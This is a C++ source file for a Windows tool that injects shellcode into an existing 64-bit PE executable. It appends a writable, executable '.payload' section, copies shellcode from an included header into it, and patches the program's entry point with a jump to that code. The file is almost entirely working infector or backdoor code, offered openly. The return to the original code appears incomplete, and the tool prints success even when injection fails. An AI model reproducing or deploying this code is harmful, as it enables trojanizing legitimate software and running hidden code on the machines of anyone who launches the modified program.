#include <iostream>
#include <windows.h>
#include <vector>
#include <fstream>

#include "shellcode.hpp"

#ifndef CUSTOM_SECTION_NAME
#define CUSTOM_SECTION_NAME ".payload"
#endif

#define P2ALIGNUP(val, align) (((val) + (align) - 1) & ~((align) - 1))

/**
 * struct PEInfo - PE file header information
 *
 * @dosHeader: Pointer to DOS header
 * @ntHeaders: Pointer to NT headers (64-bit compatible)
 * @sectionAlignment: Section alignment from optional header
 * @fileAlignment: File alignment from optional header
 * @numberOfSections: Number of sections from file header
 * @firstSection: Pointer to first section header
 * @lastSection: Pointer to last section header
 * @originalEntryPoint: Original address of entry point RVA
 * @oldImageSize: Original size of image
 */
struct PEInfo {
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS64 ntHeaders;
    DWORD sectionAlignment;
    DWORD fileAlignment;
    WORD numberOfSections;
    PIMAGE_SECTION_HEADER firstSection;
    PIMAGE_SECTION_HEADER lastSection;
    DWORD originalEntryPoint;
    DWORD oldImageSize;
};

/**
 * GetPEInfo - Parse PE headers and fill PEInfo structure
 *
 * @pView: Mapped view of the PE file
 * @info: Pointer to PEInfo structure to fill
 *
 * Validates DOS and NT signatures, extracts key header info.
 *
 * Return: true on success, false on failure
 */
bool GetPEInfo(PVOID pView, PEInfo* info) {
    info->dosHeader = (PIMAGE_DOS_HEADER)pView;
    if (info->dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::wcerr << L"Error: Invalid DOS signature" << std::endl;
        return false;
    }

    info->ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)pView + info->dosHeader->e_lfanew);
    if (info->ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        std::wcerr << L"Error: Invalid NT signature" << std::endl;
        return false;
    }

    info->originalEntryPoint = info->ntHeaders->OptionalHeader.AddressOfEntryPoint;
    info->oldImageSize = info->ntHeaders->OptionalHeader.SizeOfImage;
    info->sectionAlignment = info->ntHeaders->OptionalHeader.SectionAlignment;
    info->fileAlignment = info->ntHeaders->OptionalHeader.FileAlignment;
    info->numberOfSections = info->ntHeaders->FileHeader.NumberOfSections;
    info->firstSection = IMAGE_FIRST_SECTION(info->ntHeaders);
    info->lastSection = info->firstSection + (info->numberOfSections - 1);

    return true;
}

/**
 * CalculateNewSectionSizes - Compute sizes and addresses for new section
 *
 * @info: PE header info
 * @shellcodeSize: Size of shellcode
 * @newVirtualAddress: Output new section RVA
 * @virtualSize: Output aligned virtual size
 * @newRawSize: Output aligned raw size
 * @newPointerToRawData: Output raw data pointer
 * @padding: Output padding to file alignment
 * @extensionSize: Output total file extension size
 *
 * Calculates aligned sizes based on payload, ensures minimum sizes.
 *
 * Return: true on success, false if no room for new header
 */
bool CalculateNewSectionSizes(const PEInfo& info, size_t shellcodeSize, DWORD* newVirtualAddress, DWORD* virtualSize, DWORD* newRawSize, DWORD* newPointerToRawData, DWORD* padding, DWORD* extensionSize, DWORD oldSize) {
    PIMAGE_SECTION_HEADER newSection = info.firstSection + info.numberOfSections;
    if ((BYTE*)newSection + sizeof(IMAGE_SECTION_HEADER) > (BYTE*)info.dosHeader + info.ntHeaders->OptionalHeader.SizeOfHeaders) {
        std::wcerr << L"Error: No room for new section header in headers area" << std::endl;
        return false;
    }

    size_t payloadSize = shellcodeSize + 5;  // Shellcode + 5 original bytes
    *virtualSize = P2ALIGNUP(payloadSize, info.sectionAlignment);
    *newRawSize = P2ALIGNUP(*virtualSize, info.fileAlignment);

    *newVirtualAddress = P2ALIGNUP(info.lastSection->VirtualAddress + info.lastSection->Misc.VirtualSize, info.sectionAlignment);
    *newPointerToRawData = P2ALIGNUP(oldSize, info.fileAlignment);
    *padding = *newPointerToRawData - oldSize;
    *extensionSize = *padding + *newRawSize;

    return true;
}

/**
 * AddSectionAndInject - Add new section header, update PE, inject payload
 *
 * @info: PE header info (from remapped view)
 * @newVirtualAddress: New section RVA
 * @virtualSize: New section virtual size
 * @newRawSize: New section raw size
 * @newPointerToRawData: New section raw pointer
 * @shellcode: Shellcode buffer
 * @shellcodeSize: Shellcode size
 * @originalEntryPoint: Original EP RVA
 *
 * Updates headers, sets new EP, copies shellcode, adds original EP data.
 *
 * No return value (assumes success after prior checks)
 */
void AddSectionAndInject(const PEInfo& info, DWORD newVirtualAddress, DWORD virtualSize, DWORD newRawSize, DWORD newPointerToRawData, const unsigned char* shellcode, size_t shellcodeSize, DWORD originalEntryPoint, BYTE* pView, DWORD padding, DWORD oldSize) {
    PIMAGE_SECTION_HEADER newSection = info.firstSection + info.numberOfSections;

    const char* sectionName = ".payload";
    DWORD characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    // Add new section header
    ZeroMemory(newSection, sizeof(IMAGE_SECTION_HEADER));
    size_t nameLen = strlen(sectionName);
    memcpy(newSection->Name, sectionName, nameLen > 8 ? 8 : nameLen);
    newSection->Misc.VirtualSize = virtualSize;
    newSection->VirtualAddress = newVirtualAddress;
    newSection->SizeOfRawData = newRawSize;
    newSection->PointerToRawData = newPointerToRawData;
    newSection->Characteristics = characteristics;

    // Update NT headers
    info.ntHeaders->FileHeader.NumberOfSections = info.numberOfSections + 1;
    info.ntHeaders->OptionalHeader.SizeOfImage = P2ALIGNUP(newSection->VirtualAddress + newSection->Misc.VirtualSize, info.sectionAlignment);

    // Zero the padding if any
    if (padding > 0) {
        ZeroMemory((BYTE*)pView + oldSize, padding);
    }

    // Copy shellcode to the new section
    BYTE* sectionData = (BYTE*)pView + newSection->PointerToRawData;
    memcpy(sectionData, shellcode, shellcodeSize);

    // Find the section containing the original entry point
    PIMAGE_SECTION_HEADER epSection = NULL;
    for (WORD i = 0; i < info.numberOfSections; i++) {
        PIMAGE_SECTION_HEADER sec = info.firstSection + i;
        if (originalEntryPoint >= sec->VirtualAddress && originalEntryPoint < sec->VirtualAddress + sec->Misc.VirtualSize) {
            epSection = sec;
            break;
        }
    }
    if (epSection == NULL) {
        std::wcerr << L"Error: Could not find section for original entry point" << std::endl;
        return;
    }

    // Calculate raw offset of original entry point
    DWORD entryRaw = epSection->PointerToRawData + (originalEntryPoint - epSection->VirtualAddress);

    // Backup original 5 bytes
    BYTE originalBytes[5];
    memcpy(originalBytes, (BYTE*)pView + entryRaw, 5);

    // Fill padding with 0xCC (int3) after shellcode
    memset(sectionData + shellcodeSize, 0xCC, virtualSize - shellcodeSize - 5);

    // Copy original 5 bytes to end of virtual size
    memcpy(sectionData + virtualSize - 5, originalBytes, 5);

    // Zero the remaining part of raw data if any (beyond virtualSize)
    if (newRawSize > virtualSize) {
        ZeroMemory(sectionData + virtualSize, newRawSize - virtualSize);
    }

    // Patch original entry point with JMP to new section (relative offset)
    INT32 relOffset = static_cast<INT32>(newVirtualAddress - originalEntryPoint - 5);
    BYTE* entryPointRaw = (BYTE*)pView + entryRaw;
    entryPointRaw[0] = 0xE9;  // JMP opcode
    memcpy(entryPointRaw + 1, &relOffset, sizeof(INT32));

    // Debugging output
    std::wcout << L"Original Entry Point RVA: 0x" << std::hex << originalEntryPoint << std::endl;
    std::wcout << L"Old SizeOfImage: 0x" << std::hex << info.oldImageSize << std::endl;
    std::wcout << L"New Section VirtualAddress: 0x" << std::hex << newVirtualAddress << std::endl;
    std::wcout << L"New Section VirtualSize: 0x" << std::hex << virtualSize << std::endl;
    std::wcout << L"New SizeOfImage: 0x" << std::hex << info.ntHeaders->OptionalHeader.SizeOfImage << std::endl;
}

bool InjectPayload(PWSTR filePath) {
    // Check file accessibility
    DWORD fileAttributes = GetFileAttributesW(filePath);
    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
        std::wcerr << L"Error: File does not exist or is inaccessible: " << filePath << L" (Error code: " << GetLastError() << L")" << std::endl;
        return false;
    }

    // Open file
    HANDLE hFile = CreateFileW(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Error opening file: " << filePath << L" (Error code: " << GetLastError() << L")" << std::endl;
        return false;
    }

    // Get original size
    LARGE_INTEGER originalFileSize;
    if (!GetFileSizeEx(hFile, &originalFileSize)) {
        std::wcerr << L"Error getting file size (Error code: " << GetLastError() << L")" << std::endl;
        CloseHandle(hFile);
        return false;
    }
    if (originalFileSize.QuadPart > 0xFFFFFFFFLL) {
        std::wcerr << L"Error: File size exceeds 4GB limit for PE modifications" << std::endl;
        CloseHandle(hFile);
        return false;
    }
    DWORD oldSize = (DWORD)originalFileSize.QuadPart;

    // Initial mapping
    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (hMapping == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Error creating file mapping (Error code: " << GetLastError() << L")" << std::endl;
        CloseHandle(hFile);
        return false;
    }

    PVOID pView = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
    if (pView == NULL) {
        std::wcerr << L"Error mapping view of file (Error code: " << GetLastError() << L")" << std::endl;
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    // Get PE info
    PEInfo info;
    if (!GetPEInfo(pView, &info)) {
        UnmapViewOfFile(pView);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    // Calculate new section sizes
    DWORD newVirtualAddress, virtualSize, newRawSize, newPointerToRawData, padding, extensionSize;
    if (!CalculateNewSectionSizes(info, shellcodeSize, &newVirtualAddress, &virtualSize, &newRawSize, &newPointerToRawData, &padding, &extensionSize, oldSize)) {
        UnmapViewOfFile(pView);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    // Unmap initial
    UnmapViewOfFile(pView);
    CloseHandle(hMapping);

    // Extend file
    LARGE_INTEGER newFileSize;
    newFileSize.QuadPart = originalFileSize.QuadPart + extensionSize;
    LARGE_INTEGER moveTo;
    moveTo.QuadPart = newFileSize.QuadPart;
    if (!SetFilePointerEx(hFile, moveTo, NULL, FILE_BEGIN) || !SetEndOfFile(hFile)) {
        std::wcerr << L"Error extending file size (Error code: " << GetLastError() << L")" << std::endl;
        CloseHandle(hFile);
        return false;
    }

    // Remap extended file
    hMapping = CreateFileMappingW(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (hMapping == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Error creating extended file mapping (Error code: " << GetLastError() << L")" << std::endl;
        CloseHandle(hFile);
        return false;
    }

    pView = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
    if (pView == NULL) {
        std::wcerr << L"Error mapping extended view (Error code: " << GetLastError() << L")" << std::endl;
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    // Reparse PE info on new view
    if (!GetPEInfo(pView, &info)) {
        UnmapViewOfFile(pView);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    // Add section and inject payload
    AddSectionAndInject(info, newVirtualAddress, virtualSize, newRawSize, newPointerToRawData, shellcode, shellcodeSize, info.originalEntryPoint, (BYTE*)pView, padding, oldSize);

    // Clean up
    UnmapViewOfFile(pView);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return true;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        std::wcout << L"USAGE: " << argv[0] << L" <path to base PE file>" << std::endl;
        return EXIT_FAILURE;
    }

    PWSTR base_pe_path = argv[1];

    if (InjectPayload(base_pe_path) == false) {
        std::wcout << L"Failed to allocate new section." << std::endl;
    }
    std::wcout << L"[+] Injected payload successfully!" << std::endl;
    return 0;
}